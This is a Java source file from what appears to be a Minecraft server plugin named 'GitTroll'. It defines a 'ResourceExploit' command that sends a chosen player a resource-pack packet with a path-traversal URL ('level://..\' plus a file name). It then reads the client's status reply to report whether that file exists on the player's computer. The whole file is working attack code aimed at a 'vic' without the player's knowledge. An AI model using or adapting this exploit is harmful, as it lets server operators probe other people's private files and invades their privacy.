package net.Lenni0451.GitTroll.command.commands.exploits;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;

import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.event.EventListener;
import net.Lenni0451.GitTroll.event.events.EventPlayerPacket;
import net.Lenni0451.GitTroll.event.types.Event;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;
import net.minecraft.server.v1_8_R3.PacketPlayInResourcePackStatus;
import net.minecraft.server.v1_8_R3.PacketPlayInResourcePackStatus.EnumResourcePackStatus;
import net.minecraft.server.v1_8_R3.PacketPlayOutResourcePackSend;

public class ResourceExploit extends CommandBase implements EventListener {
	
	private final Map<String, CustomPlayer> hashes = new HashMap<>();

	public ResourceExploit() {
		super("ResourceExploit", "Check if a file exists on the computer of a player", "<Player> <File Name>");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLarger(1)) {
			String player = args.getString(0);
			String file = args.getAsString(1);

			CustomPlayer vic = this.parsePlayer(player, executor);

			String hash = UUID.randomUUID().toString();
			vic.sendPacket(new PacketPlayOutResourcePackSend("level://..\\" + file.replace("/", "\\"), hash));
			hashes.put(hash, executor);
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isLength(0)) {
			this.tabCompletePlayers(tabComplete);
		}
	}

	@Override
	public void onEvent(Event event) {
		if(event instanceof EventPlayerPacket) {
			EventPlayerPacket epp = (EventPlayerPacket) event;
			if(epp.getPacket() instanceof PacketPlayInResourcePackStatus) {
				PacketPlayInResourcePackStatus resourcepackStatus = (PacketPlayInResourcePackStatus) epp.getPacket();
				
				try {
					Field field = resourcepackStatus.getClass().getDeclaredField("a");
					field.setAccessible(true);
					String hash = (String) field.get(resourcepackStatus);
					EnumResourcePackStatus status = resourcepackStatus.b;
					
					if(!this.hashes.containsKey(hash)) {
						return;
					}
					
					if(status.equals(EnumResourcePackStatus.ACCEPTED)) {
						this.hashes.get(hash).sendGitMessage("The player has the file on his computer.");
					} else if(status.equals(EnumResourcePackStatus.FAILED_DOWNLOAD)) {
						this.hashes.get(hash).sendGitMessage("§cThe player does not have the file on his computer.");
					} else {
						this.hashes.get(hash).sendGitMessage("§cThe player has fixed the vulnerability.");
					}
					this.hashes.remove(hash);
				} catch (Exception e) {}
			}
		}
	}
	
}
